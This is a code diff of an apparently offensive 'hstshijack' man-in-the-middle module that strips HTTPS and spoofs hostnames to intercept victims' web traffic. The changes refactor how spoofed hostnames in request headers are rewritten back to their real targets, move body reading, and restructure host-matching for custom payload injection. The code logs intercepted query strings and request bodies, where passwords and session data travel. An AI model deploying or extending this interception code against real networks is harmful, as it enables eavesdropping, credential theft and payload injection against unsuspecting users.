@@ -204,7 +204,7 @@ function onRequest(req, res) {
 		}
 	}
 	if (!ignored) {
-		// Handle SSL log callbacks (find out of host uses SSL)
+		// Handle SSL log callbacks (find out if host uses SSL)
 		if (req.Path == "/" + ssl_log_path) {
 			loggable_host = atob(req.Query)
 			log_debug("(" + green + "hstshijack" + reset + ") Received callback for " + loggable_host + ".")
@@ -233,9 +233,9 @@ function onRequest(req, res) {
 				regexp = wildcardToRegexp(replacement_hosts[i])
 				if ( req.Hostname.match(regexp) ) {
 					log_info("(" + green + "hstshijack" + reset + ") Silent callback received from " + req.Client + " for " + req.Hostname)
-					index = 0
-					Object.keys(callback_log).length > 0 ? index = Object.keys(callback_log).length + 1 : ""
-					callback_log[index] = {
+					new_index = 0
+					Object.keys(callback_log).length > 0 ? new_index = Object.keys(callback_log).length + 1 : ""
+					callback_log[new_index] = {
 						"client"   : req.Client,
 						"spoofed"  : replacement_hosts[i]
 						"original" : target_hosts[i]
@@ -249,20 +249,12 @@ function onRequest(req, res) {
 			}
 			console.log("  Request Query:\n")
 			console.log("    " + green + req.Query + reset)
+			req.ReadBody()
 			console.log("\n  Request Body:\n")
-			console.log( "    " + green + req.ReadBody() + reset )
 			console.log("    " + green + req.Body + reset + "\n")
 		} else {
-			req_headers = req.Headers.split("\r\n")
-			// Patch spoofed hostnames in headers
-			for (var i = 0; i < replacement_hosts.length; i++) {
-				regexp      = new RegExp( replacement_hosts[i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)") + "()", "ig" )
-				replacement = "$1" + target_hosts[i].replace("*", "")
-				while ( req.Headers.match(regexp) ) {
-					req.Headers = req.Headers.replace(regexp, replacement)
-				}
-			}
 			// Patch SSL in headers
+			req_headers = req.Headers.split("\r\n")
 			for (var a = 0; a < req_headers.length; a++) {
 				for (var b = 0; b < ssl_log.length; b++) {
 					regexp      = new RegExp( "(.*?)http:\/\/" + ssl_log[b].replace(/\./g, "\\.").replace(/\-/g, "\\-"), "ig" )
@@ -272,8 +264,14 @@ function onRequest(req, res) {
 					req.SetHeader( req_header_name, req_header_value.replace(regexp, replacement) )
 				}
 			}
-			// Patch spoofed hostname of request
 			for (var i = 0; i < target_hosts.length; i++) {
+				// Patch spoofed hostnames in headers
+				regexp      = new RegExp( replacement_hosts[i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)") + "()", "ig" )
+				replacement = "$1" + target_hosts[i].replace("*", "")
+				while ( req.Headers.match(regexp) ) {
+					req.Headers = req.Headers.replace(regexp, replacement)
+				}
+				// Patch spoofed hostname of request
 				regexp = wildcardToRegexp(replacement_hosts[i])
 				if ( req.Hostname.match(regexp) ) {
 					spoofed_host = req.Hostname
@@ -325,17 +323,19 @@ function onResponse(req, res) {
 				ignored = true
 				for (var b = 0; b < target_hosts.length; b++) {
 					regexp = wildcardToRegexp(target_hosts[b])
-					req.Hostname.match(regexp) ? ignored = false : ""
-					regexp = wildcardToRegexp(replacement_hosts[b])
-					req.Hostname.match(regexp) ? ignored = false : ""
-					!ignored ? b = target_hosts.length : ""
-				}
-				for (var b = 0; b < custom_payloads.length; b++) {
-					custom_payload_host = custom_payloads[b].replace(/\:.*/, "")
-					regexp = wildcardToRegexp(custom_payload_host)
 					if ( req.Hostname.match(regexp) ) {
 						ignored = false
-						b = custom_payloads.length
+						b = target_hosts.length
+					}
+				}
+				if (ignored) {
+					for (var b = 0; b < custom_payloads.length; b++) {
+						custom_payload_host = custom_payloads[b].replace(/\:.*/, "")
+						regexp = wildcardToRegexp(custom_payload_host)
+						if ( req.Hostname.match(regexp) ) {
+							ignored = false
+							b = custom_payloads.length
+						}
 					}
 				}
 				if (ignored) {
